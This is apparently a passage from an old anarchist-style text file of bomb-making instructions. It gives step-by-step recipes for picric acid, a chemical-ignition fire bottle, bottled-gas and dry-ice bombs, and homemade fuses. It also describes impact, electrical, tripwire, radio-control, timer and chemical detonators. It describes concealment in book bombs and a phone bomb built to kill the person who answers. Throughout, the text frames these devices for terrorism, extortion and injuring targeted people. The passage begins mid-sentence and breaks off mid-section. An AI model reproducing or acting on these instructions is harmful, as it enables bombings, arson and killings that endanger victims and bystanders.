fuel makes detonation byproducts health hazzards as the mixture is oxygen
poor.  Note that commercial fertilizer products do not work as well as the
porous AN prills dupont sells, because fertilizers are coated with various
materials meant to seal them from moisture, which keep the oil from being
absorbed.

   Another problem with ANFO:  for reliable detonation, it needs confinement,
either from a casing, borehole, etc, or from the mass of the charge.  Thus, a
pile of the stuff with a booster in it is likely to scatter and burn rather
than explode when the booster is shot.  In boreholes, or reasonable strong
casings (cardboard, or heavy plastic film sacks) the stuff detonated quite
well.  So will big piles.  Thats how the explosive potential was discovered: a
small oil freighter rammed a bulk chemical ship.  Over several hours the
cargoes intermixed to some degree, and reached critical mass.  Real big bang.
A useful way to obtain the containment needed is to replace the fuel oil with
a wax fuel.  Mix the AN with just enough melted wax to form a cohesive
mixture, mold into shape.  The wax fuels, and retains the mixture. This is
what the US military uses as a man placed cratering charge.  The military
literature states this can be set off by a blasting cap, but it is important
to remember the military blasting caps are considerable more powerful than
commercial ones.  The military rightly insists on reliability, and thus a
strong cap (maybe 70-80 percent stronger than commercial).  They also tend to
go overboard when calculating demolition charges...., but then hey, who
doesn't....

   Two manuals of interest:  Duponts "Blaster's Handbook", a $20 manual mainly
useful for rock and seismographic operations.  Atlas's "Powder Manual" or
"Manual of Rock Blasting" (I forget the title, its in the office).  This is a
$60 book, well worth the cash, dealing with the above two topics, plus
demolitions, and non-quarry blasting.

    Incidently, combining fuel oil and ammonium nitrate constitutes the
manufacture of a high explosive, and requires a federal permit to manufacture
and store. Even the mines that mix it on site require the permit to
manufacture.  Those who don't manufacture only need permits to store.  Those
who don't store need no permits, which includes most of us:  anyone, at least
in the US may purchase explosives, provided they are 21 or older, and have no
criminal record.  Note they ought to be used immediately, because you do need
a liscence to store. Note also that commercial explosives contain quantities
of tracing agents, which make it real easy for the FBI to trace the explosion
to the purchaser, so please, nobody blow up any banks, orphanages, or old
folks homes, okay.

 PICRIC ACID                  Brought to you by: -= Mondain =-



     Picric acid, also known as Tri-Nitro-Phenol, or T.N.P., is a military
explosive that is most often used as a booster charge to set off another less
sensitive explosive, such as T.N.T.  It another explosive that is fairly
simple to make, assuming that one can acquire the concentrated sulfuric and
nitric acids.  Its procedure for manufacture is given in many college
chemistry lab manuals, and is easy to follow.  The main problem with picric
acid is its tendency to form dangerously sensitive and unstable picrate salts,
such as potassium picrate.  For this reason, it is usually made into a safer
form, such as ammonium picrate, also called explosive D.  A social deviant
would probably use a formula similar to the one presented here to make picric
acid.

     MATERIALS                         EQUIPMENT
                              
     phenol (9.5 g)                    500 ml flask

     concentrated                      adjustable heat source
     sulfuric acid  (12.5 ml)
                                       1000 ml beaker
     concentrated nitric               or other container
     acid (38 ml)                      suitable for boiling in

     distilled water                   filter paper
                                       and funnel

                                       glass stirring rod


1) Place 9.5 grams of phenol into the 500 ml flask, and carefully add 12.5 ml
   of concentrated sulfuric acid and stir the mixture.

2) Put 400 ml of tap water into the 1000 ml beaker or boiling container and
   bring the water to a gentle boil.

3) After warming the 500 ml flask under hot tap water, place it in the boiling
   water, and continue to stir the mixture of phenol and acid for about thirty
   minutes.  After thirty minutes, take the flask out, and allow it to cool
   for about five minutes.

4) Pour out the boiling water used above, and after allowing the container to
   cool, use it to create an ice bath, similar to the one used in section
   3.13, steps 3-4.  Place the 500 ml flask with the mixed acid an phenol in
   the ice bath.  Add 38 ml of concentrated nitric acid in small amounts,
   stirring the mixture constantly.  A vigorous but "harmless" reaction should
   occur.  When the mixture stops reacting vigorously, take the flask out of
   the ice bath.

5) Warm the ice bath container, if it is glass, and then begin boiling more
   tap water.  Place the flask containing the mixture in the boiling water,
   and heat it in the boiling water for 1.5 to 2 hours.

6) Add 100 ml of cold distilled water to the solution, and chill it in an ice
   bath until it is cold.

7) Filter out the yellowish-white picric acid crystals by pouring the solution
   through the filter paper in the funnel.  Collect the liquid and dispose of
   it in a safe place, since it is corrosive.

8) Wash out the 500 ml flask with distilled water, and put the contents of the
   filter paper in the flask.  Add 300 ml of water, and shake vigorously.

9) Re-filter the crystals, and allow them to dry.

10) Store the crystals in a safe place in a glass container, since they will
    react with metal containers to produce picrates that could explode
    spontaneously.


  CHEMICAL FIRE BOTTLE

     The chemical fire bottle is really an advanced molotov cocktail.  Rather
than using the burning cloth to ignite the flammable liquid, which has at best
a fair chance of igniting the liquid, the chemical fire bottle utilizes the
very hot and violent reaction between sulfuric acid and potassium chlorate.
When the container breaks, the sulfuric acid in the mixture of gasoline sprays
onto the paper soaked in potassium chlorate and sugar.  The paper, when struck
by the acid, instantly bursts into a white flame, igniting the gasoline.  The
chance of failure to ignite the gasoline is less than 2%, and can be reduced
to 0%, if there is enough potassium chlorate and sugar to spare.


     MATERIALS                         EQUIPMENT
                              
     potassium chlorate               12 oz.glass bottle
     (2 teaspoons)

     sugar (2 teaspoons)              cap for bottle, w/plastic inside               

     conc. sulfuric acid (4 oz.)      cooking pan with raised edges

     gasoline (8 oz.)                 paper towels

                                      glass or plastic cup and spoon

1) Test the cap of the bottle with a few drops of sulfuric acid to make sure
   that the acid will not eat away the bottle cap during storage.  If the acid
   eats through it in 24 hours, a new top must be found and tested, until  a
   cap that the acid does not eat through is found.  A glass top is excellent.

2) Carefully pour 8 oz. of gasoline into the glass bottle.

3) Carefully pour 4 oz. of concentrated sulfuric acid into the glass bottle.
   Wipe up any spills of acid on the sides of the bottle, and screw the cap on
   the bottle.  Wash the bottle's outside with plenty of water.  Set it aside
   to dry.

4) Put about two teaspoons of potassium chlorate and about two teaspoons of
   sugar into the glass or plastic cup.  Add about 1/2 cup of boiling water,
   or enough to dissolve all of the potassium chlorate and sugar.

5) Place a sheet of paper towel in the cooking pan with raised edges.  Fold
   the paper towel in half, and pour the solution of dissolved potassium
   chlorate and sugar on it until it is thoroughly wet.  Allow the towel to
   dry.

6) When it is dry, put some glue on the outside of the glass bottle containing
   the gasoline and sulfuric acid mixture.  Wrap the paper towel around the
   bottle, making sure that it sticks to it in all places.  Store the bottle
   in a place where it will not be broken or tipped over.

7) When finished, the solution in the bottle should appear as two distinct
   liquids, a dark brownish-red solution on the bottom, and a clear solution
   on top.  The two solutions will not mix.  To use the chemical fire bottle,
   simply throw it at any hard surface.

8) NEVER OPEN THE BOTTLE, SINCE SOME SULFURIC ACID MIGHT BE ON THE CAP, WHICH
   COULD TRICKLE DOWN THE SIDE OF THE BOTTLE AND IGNITE THE POTASSIUM
   CHLORATE, CAUSING A FIRE AND/OR EXPLOSION.

9) To test the device, tear a small piece of the paper towel off the bottle,
   and put a few drops of sulfuric acid on it.  The paper towel should
   immediately burst into a white flame.


  BOTTLED GAS EXPLOSIVES

     Bottled gas, such as butane for refilling lighters, propane for propane
stoves or for bunsen burners, can be used to produce a powerful explosion. To
make such a device, all that a simple-minded anarchist would have to do would
be to take his container of bottled gas and place it above a can of Sterno or
other gelatinized fuel, light the fuel and run. Depending on the fuel used,
and on the thickness of the fuel container, the liquid gas will boil and
expand to the point of bursting the container in about five minutes.

 In theory, the gas would immediately be ignited by the burning gelatinized
fuel, producing a large fireball and explosion. Unfortunately, the bursting of
the bottled gas container often puts out the fuel, thus preventing the
expanding gas from igniting.  By using a metal bucket half filled with
gasoline, however, the chances of ignition are better, since the gasoline is
less likely to be extinguished.  Placing the canister of bottled gas on a bed
of burning charcoal soaked in gasoline would probably be the most effective
way of securing ignition of the expanding gas, since although the bursting of
the gas container may blow out the flame of the gasoline, the burning charcoal
should immediately re-ignite it.  Nitrous oxide, hydrogen, propane, acetylene,
or any other flammable gas will do nicely.

  During the recent gulf war, fuel/air bombs were touted as being second only
to nuclear weapons in their devastating effects. These are basically similar
to the above devices, except that an explosive charge is used to rupture the
fuel container and disperse it over a wide area. a second charge is used to
detonate the fuel. The reaction is said to produce a massive shockwave and to
burn all the oxygen in a large area, causing suffocation.

  Another benefit of a fuel-air explosive is that the gas will seep into
fortified bunkers and other partially-sealed spaces, so a large bomb placed in
a building would result in the destruction of the majority of surrounding
rooms, rendering it structurally unsound.

 Fun with dry ice... LOTS of fun with dry ice.  (from the Usenet.)
 ---------------------------------------------


   There is no standard formula for a dry ice bomb, however a generic form is
as follows:

Take a 2-liter soda bottle, empty it completely, then add about 3/4 Lb of
Dry Ice (crushed works best) and (optional) a quantity of water.

   Depending on the condition of the bottle, the weather, and the amount and
temperature of the bottle the bomb will go off in 30 seconds - 5 minutes.
Without any water added, the 2-liter bottles will go often in 3-7 minutes if
dropped into a warm river, and in 45 minutes to 1 1/2 hours in open air.

   The explosion sounds equivalent to an M-100. _Plastic_ 16 oz. soda bottles
and 1 liter bottles work almost as well as do the 2-liters, however glass
bottles aren't nearly as loud, and can produce dangerous shrapnel.

   Remember, these are LOUD! A classmate of mine set up 10 bottles
in a nearby park without adding water. After the first two went off (there
was about 10 minutes between explosions) the Police arrived and spent the
next hour trying to find the guy who they thought was setting off M-100's
all around them...

USES FOR DRY ICE

Time Bombs:

1.   Get a small plastic container with lid (we used the small plastic  cans
  that hold the coaters used for large-format Polaroid film). A  film canister
  would probably work; the key is, it should seal tightly  and take a fair
  amount of effort to open).
     Place a chunk of dry ice in the can, put on the lid without quite
  sealing it. Put the assembled bomb in your pocket, or behind your  back.
     Approach the mark and engage in normal conversation. When his  attention
  is drawn away, quickly seal the lid on the bomb, deposit it  somewhere
  within a few feet of the mark, out of obvious sight, then  leave.
      Depending on variables (you'll want to experiment first), you'll hear  a
  loud "pop" and an even louder "Aarrggghhh!" within a minute, when  the CO2
  pressure becomes sufficient to blow off the lid.
     In a cluttered lab, this is doubly nasty because the mark will  proabably
  never figure out what made the noise.

2.  Put 2-3 inches of water in a 2-liter plastic pop bottle.  Put in  as many
  chunks of dry ice as possible before the smoke gets too thick.  Screw on the
  cap, place in an appropriate area, and run like hell.  After about a minute
  (your mileage may vary), a huge explosion will  result, spraying water
  everywhere, along with what's left of the 2-liter bottle.

More things to do with Dry Ice:

   Has anyone ever thrown dry ice into a public pool?  As long as you chuck it
into the bottom of the deep end, it's safe, and it's really impressive if the
water is warm enough

     "Fun stuff. It SCREAMS when it comes into contact with metal..."
     "You can safely hold a small piece of dry ice in your mouth if you  
     KEEP IT MOVING CONSTANTLY. It looks like you're smoking or on fire."

       Editor's Note:   Dry ice can be a lot of fun, but be forewarned:

    Using anything but plastic to contain dry ice bombs is suicidal.  Dry ice
is more dangerous than TNT, because it's extremely unpredictable.  Even a
2-liter bottle can produce some nasty shrapnel:  One source tells me that he
caused an explosion with a 2-liter bottle that destroyed a metal garbage can.
In addition, it is rumored that several kids have been killed by shards of
glass resulting from the use of a glass bottle. For some reason, dry ice bombs
have become very popular in the state of Utah. As a result, dry ice bombs have
been classified as infernal devices, and possession is a criminal offense.

  IGNITION DEVICES

     There are many ways to ignite explosive devices.  There is the classic
"light the fuse, throw the bomb, and run" approach, and there are sensitive
mercury switches, and many things in between.  Generally, electrical
detonation systems are safer than fuses, but there are times when fuses are
more appropriate than electrical systems; it is difficult to carry an
electrical detonation system into a stadium, for instance, without being
caught.  A device with a fuse or impact detonating fuze would be easier to
hide.

  FUSE IGNITION

     The oldest form of explosive ignition, fuses are perhaps the favorite
type of simple ignition system.  By simply placing a piece of waterproof fuse
in a device, one can have almost guaranteed ignition.  Modern waterproof fuse
is extremely reliable, burning at a rate of about 2.5 seconds to the inch.  It
is available as model rocketry fuse in most hobby shops, and costs about $3.00
for a nine-foot length.  Cannon Fuse is a popular ignition system for pipe
bombers because of its simplicity.  All that need be done is light it with a
match or lighter. Of course, if the Army had fuses like this, then the
grenade, which uses fuse ignition, would be very impracticle.  If a grenade
ignition system can be acquired, by all means, it is the most effective.  But,
since such things do not just float around, the next best thing is to prepare
a fuse system which does not require the use of a match or lighter, but still
retains its simplicity. One such method is described below:


     MATERIALS
     _________
     strike-on-cover type matches       electrical tape or duct tape
     waterproof fuse

1) To determine the burn rate of a particular type of fuse, simply measure a 6
   inch or longer piece of fuse and ignite it.  With a stopwatch, press the
   start button the at the instant when the fuse lights, and stop the watch
   when the fuse reaches its end.  Divide the time of burn by the length of
   fuse, and you have the burn rate of the fuse, in seconds per inch.  This
   will be shown below:

     Suppose an eight inch piece of fuse is burned, and its complete time of
    combustion is 20 seconds.

     20 seconds / 8 inches = 2.5 seconds per inch.

     If a delay of 10 seconds was desired with this fuse, divide the desired
     time by the number of seconds per inch:

     10 seconds / 2.5 seconds per inch  = 4 inches

NOTE: THE LENGTH OF FUSE HERE MEANS LENGTH OF FUSE TO THE POWDER.  SOME FUSE,
  AT LEAST AN INCH, SHOULD BE INSIDE THE DEVICE.  ALWAYS ADD THIS EXTRA INCH,
  AND PUT THIS EXTRA INCH AN INCH INTO THE DEVICE!!!

2) After deciding how long a delay is desired before the explosive device is
   to go off, add about 1/2 an inch to the premeasured amount of fuse, and cut
   it off.

3) Carefully remove the cardboard matches from the paper match case.  Do not
   pull off individual matches; keep all the matches attached to the cardboard
   base.  Take one of the cardboard match sections, and leave the other one to
   make a second igniter.

4) Wrap the matches around the end of the fuse, with the heads of the matches
   touching the very end of the fuse.  Tape them there securely, making sure
   not to put tape over the match heads.  Make sure they are very secure by
   pulling on them at the base of the assembly.  They should not be able to
   move.

5) Wrap the cover of the matches around the matches attached to the fuse,
   making sure that the striker paper is below the match heads and the striker
   faces the match heads.  Tape the paper so that is fairly tight around the
   matches. Do not tape the cover of the striker to the fuse or to the
   matches. Leave enough of the match book to pull on for ignition.

     The match book is wrapped around the matches, and is taped to itself.     
The matches are taped to the fuse.  The striker will rub against the     
matcheads when the match book is pulled.

6) When ready to use, simply pull on the match paper.  It should pull the
   striking paper across the match heads with enough friction to light them.
   In turn, the burning matcheads will light the fuse, since it adjacent to
   the burning match heads.


     HOW TO MAKE BLACKMATCH FUSE:
     ----------------------------

  Take a flat piece of plastic or metal (brass or aluminum are easy to work
with and won't rust).  Drill a 1/16th inch hole through it.  This is your die
for sizing the fuse.  You can make fuses as big as you want, but this is the
right size for the pipe bomb I will be getting to later.

   To about 1/2 cup of black powder add water to make a thin paste.  Add 1/2
teaspoon of corn starch. Cut some one foot lengths of cotton thread.  Use
cotton, not silk or thread made from synthetic fibers.  Put these together
until you have a thickness that fills the hole in the die but can be drawn
through very easily.

  Tie your bundle of threads together at one end. Separate the threads and
hold the bundle over the black powder mixture. Lower the threads with a
circular motion so they start curling onto the mixture.  Press them under with
the back of a teaspoon and continue lowering them so they coil into the paste.
Take the end you are holding and thread it through the die.  Pull it through
smoothly in one long motion.

  To dry your fuse, lay it on a piece of aluminum foil and bake it in your 250
degree oven or tie it to a grill in the oven and let it hang down.  The fuse
must be baked to make it stiff enough for the uses it will be put to later.
Air drying will not do the job.  If you used Sodium Nitrate, it will not even
dry completely at room temperatures.

Cut the dry fuse with sissors into 2 inch lengths and store in an air tight
container.  Handle this fuse carefuly to avoid breaking it.  You can also use
a firecracker fuse if you have any available.  The fuses can usually be pulled
out without breaking.  To give yourself some running time, you will be
extending these fuses (blackmatch or firecracker fuse) with sulfured wick.

    Finally, it is possible to make a relatively slow-burning fuse in the
home. By dissolving about one teaspoon of black powder in about 1/4 a cup of
boiling water, and, while it is still hot, soaking in it a long piece of all
cotton string, a slow-burning fuse can be made. After the soaked string dries,
it must then be tied to the fuse of an explosive device. Sometimes, the end of
the slow burning fuse that meets the normal fuse has a charge of black powder
or gunpowder at the intersection point to insure ignition, since the
slow-burning fuse does not burn at a very high temperature.

 A similar type of slow fuse can be made by taking the above mixture of
boiling water and black powder and pouring it on a long piece of toilet paper.
The wet toilet paper is then gently twisted up so that it resembles a
firecracker fuse, and is allowed to dry.


                       HOW TO MAKE SULFURED WICK
                       -------------------------


   Use heavy cotton string about 1/8th inch in diameter.  You can find some at
a garden supply for tieing up your tomatoes.  Be sure it's cotton.  You can
test it by lighting one end.  It sould continue to burn after the match is
removed and when blown out will have a smoldering coal on the end.  Put some
sulfur in a small container like a small pie pan and melt it in the oven at
250 degrees.

    It will melt into a transparent yellow liquid.  If it starts turning
brown, it is too hot.  Coil about a one foot length of string into it.  The
melted sulfur will soak in quickly.  When saturated, pull it out and tie it up
to cool and harden.

  It can be cut to desired lengths with sissors.  2 inches is about right.
These wicks will burn slowly with a blue flame and do not blow out easily in a
moderate wind. They will not burn through a hole in a metal pipe, but are
great for extending your other fuse.  They will not throw off sparks.
Blackmatch generates sparks which can ignite it along its length causing
unpredictable burning times.


--IMPACT IGNITION

     Impact ignition is an excellent method of ignition for spontaneous
terrorist activities.  The problem with an impact-detonating device is that it
must be kept in a very safe container so that it will not explode while being
transported to the place where it is to be used.  This can be done by having a
removable impact initiator.

     The best and most reliable impact initiator is one that uses factory made
initiators or primers. A no. 11 cap for black powder firearms is one such
primer. They usually come in boxes of 100, and cost about $2.50. To use such a
cap, however, one needs a nipple that it will fit on. Black powder nipples are
also available in gun stores. All that a person has to do is ask for a package
of nipples and the caps that fit them.  Nipples have a hole that goes all the
way through them, and they have a threaded end, and an end to put the cap on.
A cutaway of a nipple is shown below:

                        |_________________|


     When making using this type of initiator, a hole must be drilled into
whatever container is used to make the bomb out of. The nipple is then screwed
into the hole so that it fits tightly. Then, the cap can be carried and placed
on the bomb when it is to be thrown. The cap should be bent a small amount
before it is placed on the nipple, to make sure that it stays in place.  The
only other problem involved with an impact detonating bomb is that it must
strike a hard surface on the nipple to set it off. By attaching fins or a
small parachute on the end of the bomb opposite the primer, the bomb, when
thrown, should strike the ground on the primer, and explode. Of course, a bomb
with mercury fulminate in each end will go off on impact regardless of which
end it strikes on, but mercury fulminate is also likely to go off if the
person carrying the bomb is bumped hard.


---MAGICUBE IGNITOR

      A VERY SENSITIVE and reliable impact iniator can be  produced from the
common MAGICUBE ($2.40 for 12) type flashbulbs. Simply crack the plastic
cover off, remove the reflector, and you will see 4 bulbs, each of which has
a small metal rod holding it in place.

     CAREFULLY grasp this rod with a pair of needle-nose pliers, and pry gently
upwards, making sure that NO FORCE IS APPLIED TO THE GLASS BULB.

     Each bulb is coated with plastic, which must be removed for them to be
effective in our application. This coating can be removed by soaking the
bulbs in a small glass of acetone for 30-45 minutes, at which point the
plastic can be easily peeled away.

     The best method to use these is to dissolve some nitrocellulose based
smokeless powder in acetone and/or ether, forming a thich glue-like paste.
Coat the end of the fuse with this paste, then stick the bulb (with the metal
rod facing out) into the paste. About half the bulb should be completely
covered, and if a VERY THIN layer of nitrocellulose is coated over the
remainder then ignition should be very reliable.

     To insure that the device lands with the bulb down, a small streamer
can be attached to the opposite side, so when it is tossed high into the air
the appropriate end will hit the ground first.


---ELECTRICAL IGNITION

     Electrical ignition systems for detonation are usually the safest and
most reliable form of ignition. Electrical systems are ideal for demolition
work, if one doesn't have to worry so much about being caught. With two spools
of 500 ft of wire and a car battery, one can detonate explosives from a
"safe", comfortable distance, and be sure that there is nobody around that
could get hurt. With an electrical system, one can control exactly what time a
device will explode, within fractions of a second. Detonation can be aborted
in  less than a second's warning, if a person suddenly walks by the detonation
sight, or if a police car chooses to roll by at the time. The two best
electrical igniters are military squibs and model rocketry igniters. Blasting
caps for construction also work well. Model rocketry igniters are sold in
packages of six, and cost about $1.00 per pack. All that need be done to use
them is connect it to two wires and run a current through them. Military
squibs are difficult to get, but they are a little bit better, since they
explode when a current is run through them, whereas rocketry igniters only
burst into flame. Most squibs will NOT detonate KClO3/petroleum jelly or RDX.
This requires a blasting cap type detonation in most cases.  There are,
however, military explosive squibs which will do the job.

Igniters can be used to set off black powder, mercury fulminate, or guncotton,
which in turn, can set of a high order explosive.


---HOW TO MAKE AN ELECTRIC FUZE    (By Capt. Hack & GW)

   Take a flashlight bulb and place it glass tip down on a file.  Grind it
down on the file until there is a hole in the end. Solder one wire to the case
of the bulb and another to the center conductor at the end.  Fill the bulb
with black powder or powdered match head. One or two flashlight batteries will
heat the filament in the bulb causing the powder to ignite.


---ANOTHER ELECTRIC FUZE

    Take a medium grade of steel wool and pull a strand out of it.  Attach it
to the ends of two pieces of copper wire by wrapping it around a few turns and
then pinch on a small piece of solder to bind the strand to the wire. You want
about 1/2 inch of steel strand between the wires.  Number 18 or 20 is a good
size wire to use.
     Cut a 1/2 by 1 inch piece of cardboard of the type used in match covers.
Place a small pile of powdered match head in the center and press it flat.
place the wires so the steel strand is on top of and in contact with the
powder. Sprinkle on more powder to cover the strand.
     The strand should be surounded with powder and not touching anything else
except the wires at its ends. Place a piece of blackmatch in contact with the
powder.  Now put a piece of masking tape on top of the lot, and fold it under
on the two ends.  Press it down so it sticks all around the powder.
      The wires are sticking out on one side and the blackmatch on the other.
A single flashlight battery will set this off.

---ELECTRO-MECHANICAL IGNITION

     Electro-mechanical ignition systems are systems that use some type of
mechanical switch to set off an explosive charge electrically.  This type of
switch is typically used in booby traps or other devices in which the person
who places the bomb does not wish to be anywhere near the device when it
explodes. Several types of electro-mechanical detonators will be discussed

---Mercury Switches

     Mercury switches are a switch that uses the fact that mercury metal
conducts electricity, as do all metals, but mercury metal is a liquid at room
temperatures. A typical mercury switch is a sealed glass tube with two
electrodes and a bead of mercury metal. It is sealed because of mercury's
nasty habit of giving off brain-damaging vapors. The diagram below may help to
explain a mercury switch.


                         ______________
                     A  /              \   B
      _____wire +______/_________       \
                       \   ( Hg   )|    /
                        \ _(_Hg___)|___/
                                   |
                                   |
                            wire - |
                                   |
                                   |

     When the drop of mercury ("Hg" is mercury's atomic symbol) touches both
contacts, current flows through the switch.  If this particular switch was in
its present position, A---B, current would be flowing, since the mercury can
touch both contacts in the horizontal position.

     If, however, it was in the | position, the drop of mercury would only
touch the + contact on the A side. Current, then couldn't flow, since mercury
does not reach both contacts when the switch is in the vertical position. This
type of switch is ideal to place by a door. If it were placed in the path of a
swinging door in the verticle position, the motion of the door would knock the
switch down, if it was held to the ground by a piece if tape. This would tilt
the switch into the verticle position, causing the mercury to touch both
contacts, allowing current to flow through the mercury, and to the igniter or
squib in an explosive device.


---Tripwire Switches

     A tripwire is an element of the classic booby trap.  By placing a nearly
invisible line of string or fishing line in the probable path of a victim, and
by putting some type of trap there also, nasty things can be caused to occur.
If this mode of thought is applied to explosives, how would one use such a
tripwire to detonate a bomb.  The technique is simple.  By wrapping the tips
of a standard clothespin with aluminum foil, and placing something between
them, and connecting wires to each aluminum foil contact, an electric tripwire
can be made,  If a piece of wood attached to the tripwire was placed between
the contacts on the clothespin, the clothespin would serve as a switch.  When
the tripwire was pulled, the clothespin would snap together, allowing current
to flow between the two pieces of aluminum foil, thereby completing a circuit,
which would have the igniter or squib in it.  Current would flow between the
contacts to the igniter or squib, heat the igniter or squib, causing it it to
explode. Make sure that the aluminum foil contacts do not touch the spring,
since the spring also conducts electricity.


---Radio Control Detonators

     In the movies, every terrorist or criminal uses a radio controlled
detonator to set off explosives.  With a good radio detonator, one can be
several miles away from the device, and still control exactly when it
explodes, in much the same way as an electrical switch.  The problem with
radio detonators is that they are rather costly.  However, there could
possibly be a reason that a terrorist would wish to spend the amounts of money
involved with a RC (radio control) system and use it as a detonator.  If such
an individual wanted to devise an RC detonator, all he would need to do is
visit the local hobby store or toy store, and buy a radio controlled toy.
Taking it back to his/her abode, all that he/she would have to do is detach
the solenoid/motor that controls the motion of the front wheels of a RC car,
or detach the solenoid/motor of the elevators/rudder of a RC plane, or the
rudder of a RC boat, and re-connect the squib or rocket engine igniter to the
contacts for the solenoid/motor.  The device should be tested several times
with squibs or igniters, and fully charged batteries should be in both he
controller and the receiver (the part that used to move parts before the
device became a detonator).

---DELAYS

     A delay is a device which causes time to pass from when a device is set
up to the time that it explodes.  A regular fuse is a delay, but it would cost
quite a bit to have a 24 hour delay with a fuse.  This section deals with the
different types of delays that can be employed by a terrorist who wishes to be
sure that his bomb will go off, but wants to be out of the country when it
does.


---FUSE DELAYS

     It is extremely simple to delay explosive devices that employ fuses for
ignition.  Perhaps the simplest way to do so is with a cigarette.  An average
cigarette burns for between 8-11 minutes. The higher the "tar" and nicotine
rating, the slower the cigarette burns. Low "tar" and nicotine cigarettes burn
quicker than the higher "tar" and nicotine cigarettes, but they are also less
likely to go out if left unattended, i.e. not smoked. Depending on the wind or
draft in a given place, a high "tar" cigarette is better for delaying the
ignition of a fuse, but there must be enough wind or draft to give the
cigarette enough oxygen to burn. People who use cigarettes for the purpose of
delaying fuses will often test the cigarettes that they plan to use in advance
to make sure they stay lit and to see how long it will burn. Once a cigarettes
burn rate is determined, it is a simple matter of carefully putting a hole all
the way through a cigarette with a toothpick at the point desired, and pushing
the fuse for a device in the hole formed.

                            |_| ---------- light this end


---TIMER DELAYS

     Timer delays, or "time bombs" are usually employed by an individual who
wishes to threaten a place with a bomb and demand money to reveal its location
and means to disarm it.  Such a device could be placed in any populated place if
it were concealed properly.  There are several ways to build a timer delay. By
simply using a screw as one contact at the time that detonation is desired, and
using the hour hand of a clock as the other contact, a simple timer can be made.
The minute hand of a clock should be removed, unless a delay of less than an
hour is desired.

     The main disadvantage with this type of timer is that it can only be set
for a maximum time of 12 hours.  If an electronic timer is used, such as that
in an electronic clock, then delays of up to 24 hours are possible.  By
removing the speaker from an electronic clock, and attaching the wires of a
squib or igniter to them, a timer with a delay of up to 24 hours can be made.
All that one has to do is set the alarm time of the clock to the desired time,
connect the leads, and go away.  This could also be done with an electronic
watch, if a larger battery were used, and the current to the speaker of the
watch was stepped up via a transformer.  This would be good, since such a
timer could be extremely small.

 The timer in a VCR (Video Cassette Recorder) would be ideal.  VCR's can
usually be set for times of up to a week.  The leads from the timer to the
recording equipment would be the ones that an igniter or squib would be
connected to.  Also, one can buy timers from electronics stores that would be
work well.  Finally, one could employ a digital watch, and use a relay, or
electro-magnetic switch to fire the igniter, and the current of the watch
would not have to be stepped up.


---CHEMICAL DELAYS

     Chemical delays are uncommon, but they can be extremely effective in some
cases. These were often used in the bombs the Germans dropped on England. The
delay would ensure that a bomb would detonate hours or even days after the
initial bombing raid, thereby increasing the terrifying effect on the British
citizenry.

  If a glass container is filled with concentrated sulfuric acid, and capped
with several thicknesses of aluminum foil, or a cap that it will eat through,
then it can be used as a delay.  Sulfuric acid will react with aluminum foil
to produce aluminum sulfate and hydrogen gas, and so the container must be
open to the air on one end so that the pressure of the hydrogen gas that is
forming does not break the container.

               |_________________|


     The aluminum foil is placed over the bottom of the container and secured
there with tape.  When the acid eats through the aluminum foil, it can be used
to ignite an explosive device in several ways.

1) Sulfuric acid is a good conductor of electricity.  If the acid that eats
   through the foil is collected in a glass container placed underneath the
   foil, and two wires are placed in the glass container, a current will be
   able to flow through the acid when both of the wires are immersed in the
   acid.

2) Sulfuric acid reacts very violently with potassium chlorate. If the acid
   drips down into a container containing potassium chlorate, the potassium
   chlorate will burst into flame.  This flame can be used to ignite a fuse,
   or the potassium chlorate can be the igniter for a thermite bomb, if some
   potassium chlorate is mixed in a 50/50 ratio with the thermite, and this
   mixture is used as an igniter for the rest of the thermite.

3) Sulfuric acid reacts with potassium permangenate in a similar way.

--FILM CANISTERS 2               (Originally By Bill)

For a relatively low shrapnel explosion, I suggest pouring it into an empty
35mm film cannister.  Poke a hole in the plastic lid for a fuse.  These
goodies make an explosion audible a mile away easily.

1) Poke the hole before putting the flash powder into the cannister.
2) Don't get any powder on the lip of the cannister.
3) Only use a very small quantity and work your way up to the desired
   result.                  
4) Do not pack the powder, it works best loose.
5) Do not grind or rub the mixture - it is friction sensitive.
6) Use a long fuse.

--BOOK BOMBS                                    Mondain


     Concealing a bomb can be extremely difficult in a day and age where
perpetrators of violence run wild.  Bags and briefcases are often searched by
authorities whenever one enters a place where an individual might intend to
set off a bomb.  One approach to disguising a bomb is to build what is called
a book bomb; an explosive device that is entirely contained inside of a book.

     Usually, a relatively large book is required, and the book must be of the
hardback variety to hide any protrusions of a bomb.  Dictionaries, law books,
large textbooks, and other such books work well.  When an individual makes a
bookbomb, he/she must choose a type of book that is appropriate for the place
where the book bomb will be placed.  The actual construction of a book bomb
can be done by anyone who possesses an electric drill and a coping saw. First,
all of the pages of the book must be glued together.  By pouring an entire
container of water-soluble glue into a large bucket, and filling the bucket
with boiling water, a glue-water solution can be made that will hold all of
the book's pages together tightly.  After the glue-water solution has cooled
to a bearable temperature, and the solution has been stirred well, the pages
of the book must be immersed in the glue-water solution, and each page must be
thoroughly soaked.

   It is extremely important that the covers of the book do not get stuck to
the pages of the book while the pages are drying. Suspending the book by both
covers and clamping the pages together in a vise works best.  When the pages
dry, after about three days to a week, a hole must be drilled into the now
rigid pages, and they should drill out much like wood. Then, by inserting the
coping saw blade through the pages and sawing out a rectangle from the middle
of the book, the individual will be left with a shell of the book's pages. The
pages, when drilled out, should look like this:

     This rectangle must be securely glued to the back cover of the book.
After building his/her bomb, which usually is of the timer or radio controlled
variety, the bomber places it inside the book.  The bomb itself, and whatever
timer or detonator is used, should be packed in foam to prevent it from
rolling or shifting about.  Finally, after the timer is set, or the radio
control has been turned on, the front cover is glued closed, and the bomb is
taken to its destination.

---PHONE BOMBS                                        -= Mondain =-

     The phone bomb is an explosive device that has been used in the past to
kill or injure a specific individual.  The basic idea is simple: when the
person answers the phone, the bomb explodes.  If a small but powerful high
explosive device with a squib was placed in the phone receiver, when the
current flowed through the receiver, the squib would explode, detonating the
high explosive in the person's hand.  Nasty.  All that has to be done is
acquire a squib, and tape the receiver switch down.

 Unscrew the mouthpiece cover, and remove the speaker, and connect the squib's
leads where it was. Place a high explosive putty, such as C-1 (see section
3.31) in the receiver, and screw the cover on, making sure that the squib is
surrounded by the C-1. Hang the phone up, and leave the tape in place.

  When the individual to whom the phone belongs attempts to answer the phone,
he will notice the tape, and remove it.  This will allow current to flow
through the squib.  Note that the device will not explode by merely making a
phone call; the owner of the phone must lift up the receiver, and remove the
tape.  It is highly probable that the phone will be by his/her ear when the
device explodes...

--IMPROVED PHONE BOMB          

    The above seems overly complicated to me... it would be better to rig the
device as follows:

  _________            FIRST UNPLUG THE PHONE FROM THE WALL
